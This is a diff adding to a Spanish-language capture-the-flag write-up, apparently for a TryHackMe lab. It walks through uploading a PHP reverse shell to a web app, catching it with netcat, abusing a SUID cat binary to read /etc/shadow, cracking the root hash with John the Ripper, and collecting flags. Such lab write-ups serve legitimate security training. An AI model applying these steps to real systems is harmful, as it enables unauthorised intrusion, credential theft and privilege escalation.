@@ -472,3 +472,149 @@ cat flag
 THM{3_i_was_the_more_deceived}
 
 no tengo permisos para hacer un PUT, asique tendre que buscar shell a partir de la web.
+
+Vuelvo a hacer login con ghost, me voy a la pestaña proyectos, en hamlet y subo una revshell, en mi caso la revshell php de PentestMonkey.
+
+Se sube correctamente, ahora tengo que ver como activarla.
+
+Si veo el código de la página del puerto 8000, encuentro esto.
+<iframe style="width:100%; height:100%" src="/repository/project/0/document/0/source/hamlet.txt"></iframe>
+
+Carga el archivo desde esta ruta /repository/project/0/document/0/source/hamlet.txt
+
+Tras unas cuantas pruebas, encuentro mi revshell en http://10.128.139.231:8000/repository/project/0/document/1/source/shell.txt.php //Tenía que cambiar el 0 por 1, intuyo que es algun tipo de índice o id.
+Y consigo una shell.
+
+sudo nc -lnvp 9003
+[sudo] contraseña para mksk:     
+Listening on 0.0.0.0 9003
+Connection received on 10.128.139.231 39122
+Linux 66505608bd11 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 GNU/Linux
+ 10:19:32 up 19 min,  0 users,  load average: 0.00, 0.02, 0.07
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ 
+
+soy www-data, asique ahora me centro en escalar privilegios.
+
+$ whoami
+www-data
+
+Los permisos me prohiben listar cosas en /home, asique me centro en buscar binarios para escalar privilegios.
+
+$ find / -perm -4000 2>/dev/null
+/bin/umount
+/bin/mount
+/bin/cat
+/bin/su
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/chsh
+
+Interesante, puedo ejecutar cat con permisos de root.
+
+$ cat /etc/shadow
+root:$y$j9T$.9s2wZRY3hcP/udKIFher1$sIBIYsiMmFlXhKOO4ZDJDXo54byuq7a4xAD0k9jw2m4:18885:0:99999:7:::
+daemon:*:18872:0:99999:7:::
+bin:*:18872:0:99999:7:::
+sys:*:18872:0:99999:7:::
+sync:*:18872:0:99999:7:::
+games:*:18872:0:99999:7:::
+man:*:18872:0:99999:7:::
+lp:*:18872:0:99999:7:::
+mail:*:18872:0:99999:7:::
+news:*:18872:0:99999:7:::
+uucp:*:18872:0:99999:7:::
+proxy:*:18872:0:99999:7:::
+www-data:*:18872:0:99999:7:::
+backup:*:18872:0:99999:7:::
+list:*:18872:0:99999:7:::
+irc:*:18872:0:99999:7:::
+gnats:*:18872:0:99999:7:::
+nobody:*:18872:0:99999:7:::
+_apt:*:18872:0:99999:7:::
+
+Consigo el hash de root.
+
+Lo paso al archivo hash.txt y lo crackeo con john.
+
+john-the-ripper --wordlist=/home/mksk/wordlists/rockyou.txt hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (crypt, generic crypt(3) [?/64])
+Cost 1 (algorithm [0:unknown 1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt 7:scrypt 10:yescrypt 11:gost-yescrypt]) is 10 for all loaded hashes
+Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
+Will run 16 OpenMP threads
+Note: Passwords longer than 24 [worst case UTF-8] to 72 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+murder           (root)     
+1g 0:00:00:13 DONE (2026-07-28 12:27) 0.07541g/s 369.2p/s 369.2c/s 369.2C/s yessica..FUCKYOU
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+Cambio de cuenta a root.
+
+$ su - root
+Password: murder
+
+ls
+whoami
+root
+
+Me muevo a su directorio y consigo la quinta flag. 
+Parece que me he saltado la cuarta.
+
+cd /root
+ls
+ls -la
+total 20
+drwx------ 1 root root 4096 Sep 15  2021 .
+drwxr-xr-x 1 root root 4096 Sep 15  2021 ..
+-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
+-rw-r--r-- 1 root root   24 Sep 16  2021 .flag
+-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
+cat .flag
+THM{5_**************ul}
+
+Bueno, pues a buscar la cuarta flag.
+
+Comienzo a listar directorios, a ver que encuentro.
+En la carpeta raíz encuentro un directorio extraño.
+
+total 88
+drwxr-xr-x   1 root root 4096 Sep 15  2021 .
+drwxr-xr-x   1 root root 4096 Sep 15  2021 ..
+-rwxr-xr-x   1 root root    0 Sep 15  2021 .dockerenv
+drwxr-xr-x   1 root root 4096 Sep  3  2021 bin
+drwxr-xr-x   2 root root 4096 Apr 10  2021 boot
+drwxr-xr-x  13 root root 3580 Jul 28 10:00 dev
+drwxr-xr-x   1 root root 4096 Sep 15  2021 etc
+drwxr-xr-x   2 root root 4096 Apr 10  2021 home
+drwxr-xr-x   1 root root 4096 Sep  3  2021 lib
+drwxr-xr-x   2 root root 4096 Sep  2  2021 lib64
+drwxr-xr-x   2 root root 4096 Sep  2  2021 media
+drwxr-xr-x   2 root root 4096 Sep  2  2021 mnt
+drwxr-xr-x   2 root root 4096 Sep  2  2021 opt
+dr-xr-xr-x 121 root root    0 Jul 28 10:00 proc
+drwx------   1 root root 4096 Sep 15  2021 root
+drwxr-xr-x   1 root root 4096 Sep  3  2021 run
+drwxr-xr-x   1 root root 4096 Sep  3  2021 sbin
+drwxr-xr-x   2 root root 4096 Sep  2  2021 srv
+drwxr-xr-x   2 root root 4096 Sep 15  2021 stage
+dr-xr-xr-x  13 root root    0 Jul 28 10:00 sys
+drwxrwxrwt   1 root root 4096 Sep  3  2021 tmp
+drwxr-xr-x   1 root root 4096 Sep  2  2021 usr
+drwxr-xr-x   1 root root 4096 Sep  3  2021 var
+
+
+/stage me llama la atención. .dockerenv también, eso me indica que estoy en un container.
+
+La cuarta flag estaba en stage.
+
+cd stage
+ls
+flag
+cat flag
+THM{4_******************go}
